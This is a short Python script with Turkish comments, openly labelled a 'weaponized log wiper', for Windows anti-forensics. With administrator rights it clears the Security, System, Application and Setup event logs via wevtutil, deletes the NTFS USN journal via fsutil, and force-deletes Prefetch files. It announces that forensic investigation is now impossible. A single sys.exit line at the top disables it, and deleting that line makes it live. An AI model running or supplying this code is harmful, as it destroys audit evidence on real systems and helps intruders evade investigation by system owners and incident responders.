import os
import sys
import ctypes

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod sistem loglarını kalıcı olarak siler.")

print("--- WEAPONIZED LOG WIPER ---")

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def nuke_logs():
    if not is_admin():
        print("[-] Yönetici yetkisi gerekli.")
        return

    print("[*] Windows Olay Günlükleri siliniyor...")
    
    # 1. EVENT LOGLARI SİL (Weaponized Part)
    # Simülasyonda 'os.remove(log.txt)' vardı.
    # Gerçekte wevtutil aracıyla sistemin hafızasını siliyoruz.
    logs = ["Security", "System", "Application", "Setup"]
    for log in logs:
        os.system(f"wevtutil cl {log}")
        print(f"   [+] {log} temizlendi.")
        
    # 2. DOSYA SİSTEMİ GEÇMİŞİNİ SİL (USN Journal)
    # Hangi dosyanın ne zaman açıldığını gösteren kayıtları siler.
    print("[*] USN Journal siliniyor...")
    os.system("fsutil usn deletejournal /D C:")
    
    # 3. PREFETCH SİL (Uygulama geçmişi)
    os.system("del /f /s /q C:\\Windows\\Prefetch\\*.*")

    print("💀 İZLER TEMİZLENDİ. Adli bilişim (Forensics) imkansız.")

if __name__ == "__main__":
    nuke_logs()